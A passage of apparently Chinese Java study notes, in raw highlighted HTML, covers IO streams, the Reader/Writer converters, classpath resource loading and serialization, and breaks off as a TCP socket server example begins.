&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>java7之后可以用更简单的try(resource)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e">// 编译器在此自动为我们写入finally并调用close()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>实际上，编译器并不会特别地为&lt;code>InputStream&lt;/code>加上自动关闭。编译器只看&lt;code>try(resource = ...)&lt;/code>中的对象是否实现了&lt;code>java.lang.AutoCloseable&lt;/code>接口，如果实现了，就自动加上&lt;code>finally&lt;/code>语句并调用&lt;code>close()&lt;/code>方法。&lt;code>InputStream&lt;/code>和&lt;code>OutputStream&lt;/code>都实现了这个接口，因此都可以用在&lt;code>try(resource)&lt;/code>中&lt;/p>
&lt;ul>
&lt;li>&lt;code>InputStream&lt;/code>提供了两个重载方法来支持读取多个字节&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>int read(byte[] b)：读取若干字节并填充到byte[]数组，返回读取的字节数
int read(byte[] b, int off, int len)：指定byte[]数组的偏移量和最大填充数
&lt;/code>&lt;/pre>&lt;p>利用上述方法一次读取多个字节时，需要先定义一个&lt;code>byte[]&lt;/code>数组作为缓冲区，&lt;code>read()&lt;/code>方法会尽可能多地读取字节到缓冲区， 但不会超过缓冲区的大小。&lt;code>read()&lt;/code>方法的返回值不再是字节的&lt;code>int&lt;/code>值，而是返回实际读取了多少个字节。如果返回&lt;code>-1&lt;/code>，表示没有更多的数据了&lt;/p>
&lt;p>利用缓冲区一次读取多个字节的代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 定义1000个字节大小的缓冲区:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 读取到缓冲区
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; bytes.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>除&lt;code>FileInputStream&lt;/code>以外还有&lt;code>ByteArrayInputStream&lt;/code>可以在内存中模拟一个&lt;code>InputStream&lt;/code>，实际上是把一个&lt;code>byte[]&lt;/code>数组在内存中变成一个&lt;code>InputStream&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#ae81ff">72&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">101&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">108&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">111&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">33&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>OutputStream&lt;/code>还提供了一个&lt;code>flush()&lt;/code>方法，它的目的是将缓冲区的内容真正输出到目的地&lt;/li>
&lt;/ul>
&lt;h3 id="字符流读写">字符流读写&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">InputStream&lt;/th>
&lt;th style="text-align:left">Reader&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">字节流，以&lt;code>byte&lt;/code>为单位&lt;/td>
&lt;td style="text-align:left">字符流，以&lt;code>char&lt;/code>为单位&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">读取字节（-1，0~255）：&lt;code>int read()&lt;/code>&lt;/td>
&lt;td style="text-align:left">读取字符（-1，0~65535）：&lt;code>int read()&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">读到字节数组：&lt;code>int read(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">读到字符数组：&lt;code>int read(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>除了特殊的&lt;code>CharArrayReader&lt;/code>和&lt;code>StringReader&lt;/code>，普通的&lt;code>Reader&lt;/code>实际上是基于&lt;code>InputStream&lt;/code>构造的，因为&lt;code>Reader&lt;/code>需要从&lt;code>InputStream&lt;/code>中读入字节流（&lt;code>byte&lt;/code>），然后，根据编码设置，再转换为&lt;code>char&lt;/code>就可以实现字符流。如果我们查看&lt;code>FileReader&lt;/code>的源码，它在内部实际上持有一个&lt;code>FileInputStream&lt;/code>。&lt;/p>
&lt;p>既然&lt;code>Reader&lt;/code>本质上是一个基于&lt;code>InputStream&lt;/code>的&lt;code>byte&lt;/code>到&lt;code>char&lt;/code>的转换器，那么，如果我们已经有一个&lt;code>InputStream&lt;/code>，想把它转换为&lt;code>Reader&lt;/code>，是完全可行的。&lt;code>InputStreamReader&lt;/code>就是这样一个转换器，它可以把任何&lt;code>InputStream&lt;/code>转换为&lt;code>Reader&lt;/code>。示例代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 持有InputStream:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 变换为Reader:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>构造&lt;code>InputStreamReader&lt;/code>时，我们需要传入&lt;code>InputStream&lt;/code>，还需要指定编码，就可以得到一个&lt;code>Reader&lt;/code>对象。上述代码可以通过&lt;code>try (resource)&lt;/code>更简洁地改写如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Reader&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;UTF-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上述代码实际上就是&lt;code>FileReader&lt;/code>的一种实现方式。&lt;/p>
&lt;p>使用&lt;code>try (resource)&lt;/code>结构时，当我们关闭&lt;code>Reader&lt;/code>时，它会在内部自动调用&lt;code>InputStream&lt;/code>的&lt;code>close()&lt;/code>方法，所以，只需要关闭最外层的&lt;code>Reader&lt;/code>对象即可&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">OutputStream&lt;/th>
&lt;th style="text-align:left">Writer&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">字节流，以&lt;code>byte&lt;/code>为单位&lt;/td>
&lt;td style="text-align:left">字符流，以&lt;code>char&lt;/code>为单位&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">写入字节（0~255）：&lt;code>void write(int b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">写入字符（0~65535）：&lt;code>void write(int c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">写入字节数组：&lt;code>void write(byte[] b)&lt;/code>&lt;/td>
&lt;td style="text-align:left">写入字符数组：&lt;code>void write(char[] c)&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">无对应方法&lt;/td>
&lt;td style="text-align:left">写入String：&lt;code>void write(String s)&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>除了&lt;code>CharArrayWriter&lt;/code>和&lt;code>StringWriter&lt;/code>外，普通的Writer实际上是基于&lt;code>OutputStream&lt;/code>构造的，它接收&lt;code>char&lt;/code>，然后在内部自动转换成一个或多个&lt;code>byte&lt;/code>，并写入&lt;code>OutputStream&lt;/code>。因此，&lt;code>OutputStreamWriter&lt;/code>就是一个将任意的&lt;code>OutputStream&lt;/code>转换为&lt;code>Writer&lt;/code>的转换器：&lt;/p>
&lt;pre tabindex="0">&lt;code>try (Writer writer = new OutputStreamWriter(new FileOutputStream(&amp;#34;readme.txt&amp;#34;), &amp;#34;UTF-8&amp;#34;)) {
// TODO:
}
&lt;/code>&lt;/pre>&lt;p>上述代码实际上就是&lt;code>FileWriter&lt;/code>的一种实现方式，这和上面的&lt;code>InputStreamReader&lt;/code>是一样的&lt;/p>
&lt;h3 id="filter模式">Filter模式&lt;/h3>
&lt;p>Filter模式可以在运行期动态增加功能，又称Decorator模式&lt;/p>
&lt;h3 id="classpath">classpath&lt;/h3>
&lt;p>从classpath读取文件就可以避免不同环境下文件路径不一致的问题，在classpath中的资源文件，路径总是以&lt;code>／&lt;/code>开头，我们先获取当前的&lt;code>Class&lt;/code>对象，然后调用&lt;code>getResourceAsStream()&lt;/code>就可以直接从classpath读取任意的资源文件：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>调用&lt;code>getResourceAsStream()&lt;/code>需要特别注意的一点是，如果资源文件不存在，它将返回&lt;code>null&lt;/code>。因此，我们需要检查返回的&lt;code>InputStream&lt;/code>是否为&lt;code>null&lt;/code>，如果为&lt;code>null&lt;/code>，表示资源文件在classpath中没有找到：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getResourceAsStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// TODO:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果我们把默认的配置放到jar包中，再从外部文件系统读取一个可选的配置文件，就可以做到既有默认的配置文件，又可以让用户自己修改配置：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Properties&lt;/span> &lt;span style="color:#111">props&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Properties&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/default.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">props&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">load&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">inputStreamFromFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./conf.properties&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样读取配置文件，应用程序启动就更加灵活&lt;/p>
&lt;h3 id="序列化反序列化">序列化&amp;amp;反序列化&lt;/h3>
&lt;p>序列化是指把一个Java对象变成二进制内容，本质上就是一个&lt;code>byte[]&lt;/code>数组&lt;/p>
&lt;p>一个Java对象要能序列化，必须实现一个特殊的&lt;code>java.io.Serializable&lt;/code>接口(标记接口Marker Interface)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行（同PHP），可设置&lt;code>serialVersionUID&lt;/code>作为版本号&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2709425275741743919L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以避免class定义变动导致的不兼容，通常可以由IDE自动生成&lt;/p>
&lt;h2 id="网络编程">网络编程&lt;/h2>
&lt;h3 id="socket---tcp">Socket - TCP&lt;/h3>
&lt;p>一个Socket就是由ip和port构成，Socket编程就是指两个进程之间的网络通信，Server&amp;amp;Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Server.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.ServerSocket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.Socket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
